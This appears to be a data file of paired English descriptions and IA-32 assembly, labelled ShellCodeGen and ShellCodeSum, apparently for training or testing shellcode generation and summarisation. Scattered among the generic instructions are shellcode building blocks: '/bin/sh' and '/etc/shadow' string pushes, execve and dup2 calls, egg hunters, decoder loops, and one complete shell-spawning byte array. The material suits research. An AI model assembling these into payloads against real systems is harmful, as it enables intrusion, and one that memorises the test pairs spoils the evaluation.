ShellCodeSum: _params:,define the _params label
ShellCodeSum: push dword 0x69622f3a,push the dword 0x69622f3a onto the stack
ShellCodeSum: jnz stage,jump to the stage label if the zero flag is cleared
"ShellCodeSum: push dword 0x74652f2f \n mov ebp, esp",push double word 0x74652f2f onto the stack and point the ebp register to the stack register
ShellCodeGen: put the syscall 54 into the eax register,push byte 54 \n pop eax
ShellCodeGen: move 0x04 into al,"mov al, 0x04"
"ShellCodeSum: mov eax, 1",system call exit
ShellCodeSum: push 0x2f2f2f2f,push 0x2f2f2f2f onto the stack
"ShellCodeSum: cmp edx, 42 \n je short loc_402B13",jump to loc_402B13 if the contents of the edx register is equal to 42
ShellCodeGen: jump to the encoded label if the result of the logical xor between the bl register and the value 0xBB is zero,"xor bl, 0xBB \n jz encoded"
ShellCodeGen: add 0x3f3f3f3f to the contents in esi and save the result in esi,"add esi, 0x3f3f3f3f"
ShellCodeGen: push the byte 0xc onto the stack,push byte 0xc
ShellCodeGen: decrement the contents of the cl register and jump to the loop_dup label if the result is not negative,dec cl \n jns loop_dup
ShellCodeGen: push the dword 0x7665642f onto the stack,push dword 0x7665642f
"ShellCodeSum: mov al, 03h",move 03h into al
ShellCodeGen: jump short to the call_write label,jmp short call_write
ShellCodeGen: load the effective address of the result of the operation [ebp+24] into the ebx register,"lea ebx, [ebp+24]"
ShellCodeGen: define the byte string 'cp /bin/sh /tmp/sh',db 'cp /bin/sh /tmp/sh'
ShellCodeGen: wait for child to terminate,"mov eax, 7"
ShellCodeSum: message db '/etc/passwd',define the string message and initialize it to '/etc/passwd'
ShellCodeGen: move dl into the byte in eax,"mov byte [eax], dl"
ShellCodeSum: push byte 67 \n pop eax,put the syscall 67 into the eax register
ShellCodeGen: move the contents of the address [ebp+12] into ecx,"mov ecx, [ebp+12]"
ShellCodeGen: return to where the function was called,ret
ShellCodeGen: push the word 0xb315 onto the stack,push word 0xb315
ShellCodeSum: push 0x69622f3a,push 0x69622f3a onto the stack
ShellCodeGen: move a byte from bl into memory address hexstr+edx+1,"mov byte [hexstr+edx+1],bl"
"ShellCodeSum: mov bl, 0x14",move 0x14 into bl
ShellCodeGen: move 0x2 into bl,"mov bl, 0x2"
ShellCodeSum: string: db 'file1.txt',define string as the byte string 'file1.txt'
ShellCodeGen: move 0x5 into bl,"mov bl, 0x5"
"ShellCodeSum: xor ebx, ebx",zero out ebx
ShellCodeSum: call_decoder:,define call_decoder function
ShellCodeSum: loop decrypt,decrement ecx and jumps to the decrypt label unless decrementing ecx caused its value to become zero
ShellCodeGen: move dword 0x50905091 into ebx,"mov ebx, dword 0x50905091"
"ShellCodeSum: sub ebx, byte 8",subtract the byte 8 from the contents of the ebx register
ShellCodeSum: main_push:,create label main_push
ShellCodeGen: define the byte string '/etc/passwd#',db '/etc/passwd#'
"ShellCodeSum: cmp byte [ebp+ecx], 7ah",compare the byte at the memory location ebp+ecx with 7ah
ShellCodeGen: push the word 0x632d onto the stack and point the edi register to the stack register,"push word 0x632d \n mov edi, esp"
"ShellCodeSum: xor [ebx], word __flag_byte",perform xor operation between ebx register and the word __flag_byte and save the result in ebx
ShellCodeGen: jump to the address specified by the label loop if the operands are not equals in the previous comparison,jne loop
ShellCodeSum: push 0x2f656c2d,push 0x2f656c2d onto the stack
ShellCodeGen: push the byte 0x02 onto the stack,push byte 0x02
"ShellCodeSum: sub al, 1 \n jnz l1",subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero
ShellCodeGen: push ebx onto the stack,push ebx
ShellCodeSum: push dword 0x10,push the dword 0x10 onto the stack
ShellCodeGen: compare the byte at the memory location buff with 61h,"cmp byte [buff], 61h"
ShellCodeSum: loop:,define the loop label
ShellCodeGen: jump short to decode if not zero,jnz short decode
ShellCodeSum: _exit:,define the _exit label
ShellCodeGen: if not equal jump to the _nex label,jne _nex
ShellCodeGen: specify file descriptor 2 standard error,"mov ebx, 2"
"ShellCodeSum: sub cl, 1 \n jnz decode",subtract the value 1 from the contents of the cl register and jump to the decode label if the result is not zero
"ShellCodeSum: mov byte [esp+3], 0x11",move 0x11 into the byte at address [esp+3]
ShellCodeSum: scasd \n jnz _end,jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi
"ShellCodeSum: mov dl, 93",move 93 into dl
ShellCodeGen: set edx to next 16 byte block,"add edx, 16"
ShellCodeSum: len equ $-encodedshellcode,define len equal to the lenght of the encodedshellcode array
ShellCodeGen: push the value 0x7461632f and the value 0x6e69622f onto the stack and point the eax register to the stack register,"push 0x7461632f \n push 0x6e69622f \n mov eax, esp"
ShellCodeGen: if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B,"cmp eax, ebp \n jnz short loc_40102B"
ShellCodeGen: push the contents of ebx register onto the stack,push ebx
"ShellCodeSum: add ax, 01",add 01 to ax
"ShellCodeSum: add esp, 3",add 3 to the contents of the esp register
"ShellCodeSum: lea ebp,[ebp+0x59]",load the effective address of the operation [ebp+0x59] into the ebp register
"ShellCodeSum: mov al, 10",transfer the value 10 to the al register
ShellCodeGen: move 0x10 into dl,"mov dl, 0x10"
ShellCodeGen: define the doubleword an_integer and initialize it to 12425,an_integer dd 12425
"ShellCodeSum: lea edi, [esi]",load the effective address [esi] into edi
ShellCodeGen: move 0x167 into ax,"mov ax, 0x167"
"ShellCodeSum: xor edx, edx",clear the edx register
ShellCodeSum: push dword 0x732f636f,push the dword 0x732f636f onto the stack
ShellCodeGen: add 2 to the eax register,"add eax, 2"
"ShellCodeSum: xor ebx, ebx",clear ebx register
ShellCodeSum: pop esp,restore the top of the stack into the esp register
ShellCodeSum: inc count,increment the memory variable count
"ShellCodeSum: mov cl, byte [esi]",move the byte in esi into cl
"ShellCodeSum: xor ecx, ecx \n mul ecx",zero out eax and ecx
ShellCodeGen: push 0x6567772f to the stack,push 0x6567772f
"ShellCodeSum: mov ecx, contents",move the memory address of contents string into ecx
ShellCodeSum: push byte 0xb \n pop eax,put the syscall 0xb into the eax register
ShellCodeGen: declare the push_cmd label,push_cmd:
ShellCodeGen: decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register,"loop main_inc \n mov ebx, esp"
ShellCodeGen: multiply eax by ebx,mul ebx
ShellCodeGen: subtract 13 from the byte at the address esi,"sub byte [esi], 13"
ShellCodeGen: push the 0x74652f2f onto the stack,push 0x74652f2f
"ShellCodeSum: mov al, byte 3h",move the byte at the address 3h into al
ShellCodeGen: copy thevalue at memory address specified by di into ax,"mov ax, [di]"
ShellCodeSum: push 0x16,push 0x16 onto the stack
"ShellCodeSum: mov ebp, esp",point ebp to the esp register
ShellCodeGen: mul eax by edx,mul edx
ShellCodeGen: define the doubleword arr and initialize it to 100,arr dd 100
ShellCodeGen: push byte 6 onto the stack,push byte 6
ShellCodeGen: push 0x4f4e2029 onto the stack,push 0x4f4e2029
ShellCodeSum: push byte 0x1c \n pop eax,put the syscall 0x1c into the eax register
ShellCodeGen: push 0x64777373 onto the stack,push 0x64777373
"ShellCodeSum: xor ax, 0x539",perform a xor operation between ax and 0x539 and save the result in ax
ShellCodeSum: push edx,preserve edx on the stack
"ShellCodeSum: mov bl, byte [esi + eax + 1]",move the byte starting at the address [esi + eax + 1] into the bl register
"ShellCodeSum: mov bl, 0x5",move the value 0x5 into the bl register
ShellCodeSum: call decoder,call the decoder function
ShellCodeSum: global _start,global _start
"ShellCodeSum: mov eax, 67",sigaction
ShellCodeGen: push 0x37373333 to the stack,push 0x37373333
"ShellCodeSum: push byte 0x8 \n mov edx, esp",push the byte 0x8 onto the stack and point edx to the stack register
ShellCodeGen: define download function,download:
ShellCodeGen: get information about the file,"mov eax, 106"
ShellCodeGen: push the word 0x632d onto the stack and point the ebx register to the stack register,"push word 0x632d \n mov ebx, esp"
ShellCodeGen: define decoder function,decoder:
ShellCodeGen: reset edx to 0,"xor edx, edx"
ShellCodeGen: decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero,loopnz next
ShellCodeSum: push 0x7665642f,push 0x7665642f onto the stack
ShellCodeSum: push 0x742f2f2f,push the 0x742f2f2f onto the stack
ShellCodeGen: exchange edx with eax,"xchg edx, eax"
ShellCodeGen: declare the output label,output:
ShellCodeGen: swap the values of esi and ebx,"xchg esi, ebx"
ShellCodeGen: push the word 0x462d onto the stack,push word 0x462d
ShellCodeGen: jump short to the stage label,jmp short stage
ShellCodeGen: system call dup2,"mov eax, 63"
"ShellCodeSum: push edx \n mov eax, esp",push the contents of the edx register onto the stack and point eax to the stack register
ShellCodeSum: jmp short _start,jump short to the _start label
"ShellCodeSum: cmp eax, eax",compare the contents of eax and the contents of eax
ShellCodeGen: jump to the next_cycle label if the zero flag is cleared,jnz next_cycle
"ShellCodeSum: mov dword [esp-0x20], 0x6b2f7379",move the value 0x6b2f7379 into the double word starting at the address [esp-0x20]
"ShellCodeSum: test eax, eax \n jz proc_name",if the contents of the eax register is zero then jump to the label proc_name
"ShellCodeGen: define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68","message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68"
"ShellCodeSum: cmp dword [eax-4], egg1 \n jne _next \n jmp eax",if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register
ShellCodeGen: copy the address of var into esi,"mov esi, var"
ShellCodeGen: move 0x1e into cl,"mov cl, 0x1e"
"ShellCodeSum: xchg edx, ebx",swap the values of edx and ebx registers
ShellCodeGen: call _exit,call _exit
ShellCodeGen: jump to the address specified by the operation fupdisasm+1,jmp fupdisasm+1
ShellCodeSum: loop decode,decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero
"ShellCodeSum: add esp, 4",add 4 to the esp register
ShellCodeGen: add the contents of edx to the contents of eax,"add eax, edx"
"ShellCodeSum: mov cx, 01",initialize cx to 01
ShellCodeSum: dec ecx \n jns _dup2_loop,decrement the contents of the ecx register and jump to the _dup2_loop label if the result is not negative
"ShellCodeSum: sub esp, 4",make room for one 4-byte local variable
ShellCodeSum: jnz scan,if not 0 then jump to the scan label
ShellCodeGen: define the _build label,_build:
ShellCodeSum: push dword 0x00000000,push the doubleword 0x00000000 onto the stack
ShellCodeGen: decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label,loop decode \n jmp short shellcode
ShellCodeGen: push 0x37373333 onto the stack,push 0x37373333
"ShellCodeSum: mov byte [ebx], 2",move 2 into the single byte at the address stored in ebx
"ShellCodeSum: cmp dword [eax], ebx",compare the dword at the address [eax] and the contents of the ebx register
ShellCodeGen: increment esi,inc esi
ShellCodeGen: jump short to 0x2c,jmp short 0x2c
ShellCodeGen: move 0x1 into dl,"mov dl, 0x1"
"ShellCodeSum: push byte 0x1 \n mov ecx, esp",push the byte 0x1 onto the stack and point ecx to the stack register
ShellCodeGen: move 0x6374652f into the dword at address [esp-12],"mov dword [esp-12], 0x6374652f"
ShellCodeGen: move edx into ebx,"mov ebx, edx"
ShellCodeGen: push the 0xa01a8c0 onto the stack,push 0xa01a8c0
"ShellCodeSum: mov dl, 1+0feh",move 1+0feh into dl
ShellCodeGen: push zero onto the stack,"xor ecx, ecx \n push ecx"
ShellCodeSum: scasd,compare the value in eax to the doubleword addressed by edi
ShellCodeSum: jz formatting,if zero jump to the formatting label
ShellCodeGen: declare the main_inc label,main_inc:
ShellCodeGen: push the byte 10 onto the stack,push byte 10
ShellCodeGen: swap the values of edx and eax registers,"xchg edx, eax"
ShellCodeSum: loop check_even_odd \n jmp short shellcode,decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label
"ShellCodeSum: mov eax, response",move address of response variable into eax
"ShellCodeSum: add eax, edx",add the contents of the edx register to the contents of eax register
ShellCodeSum: neg ebx,replaces the contents of the ebx register with its two's complement
"ShellCodeSum: add al, 0x66",add 0x66 to the contents in al and save the result in al
ShellCodeGen: jump short to the here label,jmp short here
ShellCodeGen: move 0x46 into al,"mov al, 0x46"
ShellCodeGen: perform xor operation between eax register and esi register and store the result in eax,"xor eax, [esi]"
ShellCodeGen: jump to the _start label if the zero flag is cleared,jnz _start
ShellCodeGen: define the call_write label,call_write:
"ShellCodeSum: cmp ecx, edx \n ja l1",if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else
ShellCodeGen: subtract 8 from esp and save the result in esp,"sub esp, 8"
ShellCodeGen: push the word 0x6873 onto the stack,push word 0x6873
"ShellCodeSum: xor cl, 0x32",perform the xor operation between cl and 0x32 and store the resut in cl
ShellCodeGen: define two label,two:
ShellCodeGen: push the 0x2f2f2f2f onto the stack,push 0x2f2f2f2f
"ShellCodeSum: mov byte [esp], 0x0a",move 0x0a into the byte at address [esp]
ShellCodeGen: jump to the encrypt label,jmp encrypt
ShellCodeGen: push the word 0x5445 onto the stack,push word 0x5445
ShellCodeSum: push 0x6e776f64,push the 0x6e776f64 onto the stack
ShellCodeGen: make the system call read,"mov eax, 3"
ShellCodeSum: dec ebx,decrement the ebx register by one
"ShellCodeSum: mov al, 0x30",move 0x30 into al
ShellCodeGen: increment the contents of the bx register,inc bx
"ShellCodeSum: sub ax, 1662",subtract the contents of the ax register by 1662
ShellCodeGen: jump to label exit if equal to 0,je exit
ShellCodeSum: push 0x7372656f,push 0x7372656f onto the stack
ShellCodeGen: push 0x2f2f2f2f to the stack,push 0x2f2f2f2f
"ShellCodeSum: mov eax, msg1",move the address of msg1 into eax
ShellCodeSum: push word [edx],push the word [edx] to the stack
ShellCodeSum: db 'cp /bin/sh /tmp/sh',define the byte string 'cp /bin/sh /tmp/sh'
ShellCodeGen: move 0x2e into al,"mov al, 0x2e"
ShellCodeGen: push the dword 0x5f657a69 onto the stack,push dword 0x5f657a69
ShellCodeGen: put the byte VALUE into the eax register,push byte VALUE \n pop eax
"ShellCodeSum: loop main_inc \n mov ebx, esp",decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register
"ShellCodeSum: xchg esi, eax",swap the values of esi and eax
"ShellCodeSum: cmp al, cl",compare the contents of al with the cl register
ShellCodeGen: put the syscall 4 into the eax register,push byte 4 \n pop eax
ShellCodeGen: multiply eax by 2 using left shift,"shl eax, 1"
ShellCodeGen: move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx,"mov word [ebx], 2"
"ShellCodeSum: cmp eax, ebx \n je all \n xor eax, eax",jump to the all label if the contents of the eax register is equal to the contents of the ebx register else zero out the eax register
ShellCodeGen: push the ebp onto the stack,push ebp
"ShellCodeSum: sub esp, 4",make space on stack
ShellCodeGen: push the 0x2 onto the stack,push 0x2
ShellCodeGen: subtract 23 from the contents of the ecx register,"sub ecx, 23"
ShellCodeGen: push the word 0x1b6 to the stack,push word 0x1b6
ShellCodeGen: push the contents of the ebp register onto the stack,push ebp
ShellCodeSum: push byte 0x02 \n pop eax,put the syscall 0x02 into the eax register
ShellCodeSum: push byte 0x2f \n pop eax,put the syscall 0x2f into the eax register
"ShellCodeSum: xor zero_reg, zero_reg",clear zero_reg
ShellCodeGen: push the byte 3h onto the stack,push byte 3h
ShellCodeGen: define word2 signed word and initialize it to -32768,word2 sword 32768
ShellCodeGen: jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register,"cmp al, 0xaa \n je decode_insertion \n xor al, bl"
ShellCodeGen: push 0x61702f63 onto the stack,push 0x61702f63
ShellCodeGen: move 0xfeffff80 into eax,"mov eax, 0xfeffff80"
"ShellCodeSum: xor eax, eax \n push eax",clear the eax register and push its contents onto the stack
ShellCodeGen: declare the here label,here:
"ShellCodeSum: mov cx, 0x301",move the value 0x301 into the cx register
ShellCodeGen: call the write function,call write
ShellCodeGen: zero out the ecx register and jump to the l1 label if the contents of the ebx register is equal to the contents of the ecx register,"xor ecx, ecx \n cmp ebx, ecx \n je l1"
ShellCodeGen: call the start function,call start
ShellCodeSum: 3:,define the label 3
ShellCodeGen: put the syscall 0x2 into the al register,"mov al, 0x2"
ShellCodeGen: jump if less than to label finished,jl finished
"ShellCodeSum: mov eax, 48",install signal handel
ShellCodeGen: push 0x2923 onto stack port,push word 0x2923
ShellCodeSum: push esp,push esp onto the stack
ShellCodeGen: define the byte string path and initialize it to '//bin/sh',path db '//bin/sh'
ShellCodeGen: move starting address of array to ecx,"mov ecx, offset array"
ShellCodeGen: put /bin/sh into the edx register,"push long 0x68732f2f \n push long 0x6e69622f \n mov edx, esp"
ShellCodeGen: add 0x2 to the contents in cl and save the result in cl,"add cl, 0x2"
ShellCodeGen: put the syscall 2 into the eax register,push byte 2 \n pop eax
ShellCodeGen: move al into the byte at address [esi+7],"mov byte [esi+7], al"
"ShellCodeSum: sub esp, 4",allocate memory for variable
"ShellCodeSum: xor byte [esi], cl",perform a xor operation between a byte in esi and cl
ShellCodeGen: increment the contents of the al register,inc al
"ShellCodeSum: test eax, eax \n jz proc_name",jump to the label proc_name if the contents of the eax register is zero
ShellCodeSum: int 80h,make syscall to terminate the program
ShellCodeGen: push 0x74652f2f onto the stack,push 0x74652f2f
ShellCodeGen: declare inc_dec function,inc_dec:
ShellCodeSum: neg_number dw -12345,define the variable neg_number of words and initialize it to -12345
ShellCodeSum: jb write,jump to label write if below
"ShellCodeSum: push 0x61702f2f \n push 0x6374652f \n mov esi, esp",push the value 0x61702f2f and the value 0x6374652f onto the stack and point the esi register to the stack register
"ShellCodeSum: add dx, 0x1b",add the value 0x1b into the dx register
ShellCodeGen: swap the contents of the eax register with the contents of the ecx register,"xchg eax, ecx"
ShellCodeGen: move bl into the byte at address [esi],"mov byte [esi], bl"
ShellCodeSum: inc edx,increment edx
ShellCodeSum: jz find_egg,jump to find_egg if zero
ShellCodeGen: jump to the instruction labeled begin,jmp begin
ShellCodeSum: scasd \n jnz IncAddr \n jmp edi,jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
"ShellCodeSum: shl eax, 16",left shift the contents of eax 16 bits
"ShellCodeSum: sub dl, al \n jns decode_pr",subtract the contents of the al register from the contents of the dl register and jump to the decode_pr label if the result is not negative
ShellCodeGen: perform the xor operation between the eax register and the value 0x6e696230,"xor eax, 0x6e696230"
"ShellCodeSum: sub eax, 0x10",subtract 0x10 from eax
"ShellCodeSum: xor eax, [edi]",perform the xor operation between eax register and edi register and store the result in eax
ShellCodeSum: jmp read,jump to the read label
"ShellCodeSum: mov eax, 7",system call waitpid
"ShellCodeSum: mov ecx, m_src3",move m_src3 to ecx
ShellCodeSum: push 0x74756f2f,push the 0x74756f2f onto the stack
"ShellCodeSum: mov cl, byte_table+2",move the 3rd element of the byte_table into cl
ShellCodeGen: move address of response variable into edx,"mov edx, response"
"ShellCodeSum: mov [ebp+var_a], eax",move the contents of eax into address defined by ebp+var_a
ShellCodeGen: move 0x3f into eax,"mov eax, 0x3f"
ShellCodeGen: push the dword 0x61747069 onto the stack,push dword 0x61747069
"ShellCodeSum: mov ebx, msg",move the address of msg string into ebx
"ShellCodeSum: xor [ecx + 116], bh",perform xor operation between the value stored at the location ecx+116 and bh
ShellCodeSum: push dword 0x6d6f646e,push the dword 0x6d6f646e onto the stack
ShellCodeSum: section .data,section data
ShellCodeGen: compare if ecx is equal to 10,"cmp ecx, 10"
"ShellCodeSum: cmp eax, 0",compare if eax is zero
"ShellCodeSum: xor ebx, word __flag_byte",perform a logical xor between the ebx register and the word __flag_byte and save the result in ebx
ShellCodeGen: load the effective address of the result of the operation [esi+8] into the ecx register,"lea ecx, [esi+8]"
"ShellCodeSum: add eax, 16",add 16 to eax
ShellCodeSum: push esi,push esi onto the stack
ShellCodeSum: not edx,perform a bit-wise inversion of edx
"ShellCodeSum: mov eax, 0x2f3e20",move 0x2f3e20 into eax
"ShellCodeSum: cmp BYTE [esi], 0x7 \n jle lowbound",jump to the lowbound label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7
"ShellCodeSum: mov ecx, 1",move 1 into ecx
"ShellCodeSum: lea cx, [bp+di+0x32]",load the effective address of the operation [bp+di+0x32] into the cx register
"ShellCodeSum: xchg ebx, ecx",exchange ebx with ecx
"ShellCodeSum: cmp cl, 0x3 \n jne loop",jump to the loop label if the contents of the cl register is not equal to the value 0x3
ShellCodeGen: push the word 0x662d onto the stack and point the esi register to the stack register,"push word 0x662d \n mov esi, esp"
ShellCodeGen: move the contents at the memory location specified by the result of the operation [ebp-4] into the ebx register,"mov ebx, [ebp-4]"
ShellCodeGen: subtract 1 from the contents of the cl register,"sub cl, 1"
ShellCodeSum: push byte 0x1f \n pop eax,put the syscall 0x1f into the eax register
ShellCodeGen: jump to the data label,jmp data
ShellCodeGen: push 0x2e373231 to the stack,push 0x2e373231
ShellCodeGen: put the syscall 0x1f into the eax register,push byte 0x1f \n pop eax
ShellCodeSum: realarray resq 10,reserve an array of ten reals for realarray
ShellCodeSum: push dword 0x0501a8c0,push the dword 0x0501a8c0 onto the stack
ShellCodeGen: define path as the byte string '//bin/sh',path db '//bin/sh'
"ShellCodeSum: mov al, byte 0bh",move the byte 0bh into al
ShellCodeSum: neg eax,negate the contents of eax
"ShellCodeSum: mov al, byte 2h",move the byte 2h into al
ShellCodeSum: push byte 11,push the byte 11 to the stack
ShellCodeGen: left rotate the contents of the edi register by 1 bit,"rol edi, 1"
ShellCodeGen: define call_shellcode function,call_shellcode:
ShellCodeGen: if the contents of the dl register is greater than or equal to the decimal value 27 then jump to the label l3,"cmp dl, 27 \n jge l3"
ShellCodeSum: push 0x752f2f2f,push 0x752f2f2f to the stack
ShellCodeGen: subtract 3e716230 from the contents of the eax register,"sub eax, 3e716230"
ShellCodeGen: write to the stdin file,"mov ebx, 0"
"ShellCodeSum: mov dword [esp-4], ecx",move ecx into the doubleword starting at the address esp-4
ShellCodeGen: if the contents of the bl register is not zero then jump to the label not_found,"test bl, bl \n jz not_found"
ShellCodeGen: mask out lowest 4 bits of the edx register,"and edx, 0000000fh"
ShellCodeGen: mask out lowest 4 bits of the ecx register,"and ecx, 0000000fh"
ShellCodeGen: allocate my_table vector of 10 words each initialized to 0,my_table times 10 dw 0
ShellCodeSum: fupdisasm:,define fupdisasm label
ShellCodeGen: move the byte at the address 6h into al,"mov al, byte 6h"
ShellCodeSum: push 1,push 1 onto the stack
"ShellCodeSum: mov eax, 1",exit
ShellCodeSum: push 0x8,push 0x8 onto the stack
ShellCodeGen: push the 0x4 onto the stack,push 0x4
"ShellCodeSum: mov [esi+13], al",move al into the address [esi+13]
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp",push ASCII /bin/sh onto the stack and point the ebx register to the stack register
"ShellCodeSum: mov eax, 0x3f",move 0x3f into eax
"ShellCodeSum: mov edx, bufflen",move bufflen into edx
ShellCodeGen: jump to the address specified by the operation fupdisasm+3,jmp fupdisasm+3
ShellCodeSum: push esi,push the esi onto the stack
ShellCodeGen: left shift the contents of the edi register by 0x1 bit,"shl edi, 0x1"
"ShellCodeSum: add ebx, ecx",add ecx to ebx
ShellCodeSum: var_b db 'c',allocate one byte of memory for var_b variable and initialize it to 'c'
"ShellCodeSum: push long 0x68732f2f \n push long 0x6e69622f \n mov edx, esp",put /bin/sh into the edx register
ShellCodeGen: move dl into the single byte at the address stored in ecx+92,"mov byte [ecx+92], dl"
ShellCodeGen: push the byte +0x46 onto the stack,push byte +0x46
ShellCodeGen: make room on the stack for local variable,"sub esp, 4"
ShellCodeSum: push '//pa',push '//pa' onto the stack
"ShellCodeSum: mov dl, 0x1",move 0x1 into dl
ShellCodeGen: if the contents of the eax register is equal to the contents of the ebx register then jump to the L1 label,"cmp eax, ebx \n je L1"
"ShellCodeSum: mov eax, 1",move the value one into eax
"ShellCodeSum: mov byte [esi+17],al",move the contents of al into the byte at the memory location specified by the operation [esi+17]
ShellCodeGen: push 0x2431243a onto the stack,push 0x2431243a
ShellCodeGen: jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register else jump short to the not_found label,"cmp bl, al \n je loop_2 \n jmp short not_found"
"ShellCodeSum: mov ecx, hexstr",move hexstr into ecx
"ShellCodeSum: mov byte al, 0x3f",move 0x3f into the byte in al
ShellCodeGen: jump to the shell label,jmp shell
"ShellCodeSum: add bx, ax",add ax to bx
ShellCodeGen: zero out the edx register and push zero onto the stack,"xor edx, edx \n push edx"
ShellCodeSum: pop ebx,restore the top of the stack into the ebx register
ShellCodeGen: move the byte at the address 0eh into bl,"mov bl, byte 0eh"
"ShellCodeSum: xchg eax, esi",swap the contents of eax and esi
ShellCodeSum: neg edi,negate edi
ShellCodeSum: push byte 0x1,push the byte 0x1 onto the stack
ShellCodeGen: push the dword 0x10 onto the stack,push dword 0x10
ShellCodeGen: move 0x7 into al,"mov al, 0x7"
ShellCodeGen: push 0x7374736f onto the stack,push 0x7374736f
ShellCodeSum: _setsockopt:,define the _setsockopt label
"ShellCodeSum: add edx, ecx",add ecx to edx
ShellCodeGen: jump to the label proc_name if the contents of the eax register is zero,"test eax, eax \n jz proc_name"
ShellCodeGen: push the value 0x6873732f and the value 0x6374652f onto the stack and point the edi register to the stack register,"push 0x6873732f \n push 0x6374652f \n mov edi, esp"
ShellCodeGen: jump to loc_402b13 if equal,je short loc_402b13
"ShellCodeSum: mov eax, 6",invoke sys_close
"ShellCodeSum: mov eax, 2",system call fork
ShellCodeGen: jump to the next_cycle label if the zero flag is set,jz next_cycle
ShellCodeGen: push 0x3170762d onto the stack,push 0x3170762d
ShellCodeSum: push edi,push edi to the stack
ShellCodeGen: declare the dup2 label,dup2:
ShellCodeGen: define the callpop function,callpop:
ShellCodeGen: define the _params label,_params:
ShellCodeSum: push 0x3170762d,push 0x3170762d to the stack
ShellCodeGen: if zero jump to the formatting label,jz formatting
ShellCodeGen: if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register,"cmp eax, ebx \n je 0x47 \n xor ecx, ecx"
ShellCodeGen: move doublewords from the stack into the general purpose registers,popad
"ShellCodeSum: mov edx, 1",move 1 into edx
ShellCodeSum: int 0x80,execute execve syscall
ShellCodeSum: buffer: resb 64,reserve 64 bytes for buffer
ShellCodeGen: move the contents of the al register at the memory location specified by the operation [bp+0x0a],"mov [bp+0x0a], al"
"ShellCodeSum: mov eax, 0xdeadc0de",move 0xdeadc0de into eax
ShellCodeGen: load the effective address of the result of the operation [esi+26] into the edx register,"lea edx, [esi+26]"
ShellCodeGen: push the byte +0x10 onto the stack,push byte +0x10
ShellCodeSum: jne checkbuzz,if the remainder is not equal to zero jump to local label checkbuzz
"ShellCodeSum: mov eax, 20",make the system call getpid
ShellCodeGen: push the value 0x6168732f and the value 0x6374652f onto the stack and point the ebx register to the stack register,"push 0x6168732f \n push 0x6374652f \n mov ebx, esp"
ShellCodeGen: subtract 0x7 from the byte in esi register,"sub bl, byte [esi]"
"ShellCodeSum: sub ax, 1662",subtract 1662 from the contents of ax register and save the result in ax
ShellCodeGen: subtract the contents of dl register from the contents of cl register and save the result in cl,"sub cl, dl"
"ShellCodeSum: push byte 0x2 \n mov ecx, esp",push the byte 0x2 onto the stack and point ecx to the stack register
"ShellCodeSum: mov [esp+58], ah",move ah into the address [esp+58]
ShellCodeGen: move decimal number 3 into ebx,"mov ebx, 3"
ShellCodeGen: negate eax,neg eax
ShellCodeGen: if the contents of the cl register is greater than or equal to the decimal value 12 then jump to the label l2,"cmp cl, 12 \n jge l2"
ShellCodeGen: define the callme label,callme:
ShellCodeGen: define the _start label,_start:
ShellCodeGen: subtract the contents of the ax register by 1662,"sub ax, 1662"
ShellCodeSum: mul ebx,multiply the contents of eax by ebx
"ShellCodeSum: mov al, 99",move 99 into al
ShellCodeGen: system call close,"mov eax, 6"
ShellCodeSum: jmp l20,jump to label l20
ShellCodeGen: move 21 into cl,"mov cl, 21"
ShellCodeGen: push the word 0x662d onto the stack and point the ecx register to the stack register,"push word 0x662d \n mov ecx, esp"
ShellCodeSum: je continue,if equal jump to label continue
ShellCodeSum: jmp fupdisasm+3,jump to the address specified by the operation fupdisasm+3
ShellCodeGen: push 0x69622f65 onto the stack,push 0x69622f65
ShellCodeGen: move the value one into eax,"mov eax, 1"
ShellCodeGen: if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register,"cmp al, 0xf2 \n je _start \n mov eax, 0x50905090"
ShellCodeSum: jmp short read,jump short to the read label
ShellCodeGen: if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register,"cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD"
ShellCodeGen: allocate one byte of memory for a_letter variable and initialize it to 'd',a_letter db 'd'
ShellCodeSum: inc eax,increment the contents of the eax register
ShellCodeGen: compare the word at the address ecx and 0x5951,"cmp word [ecx], 0x5951"
ShellCodeSum: ret,return
ShellCodeGen: subtract ebx from eax,"sub eax, ebx"
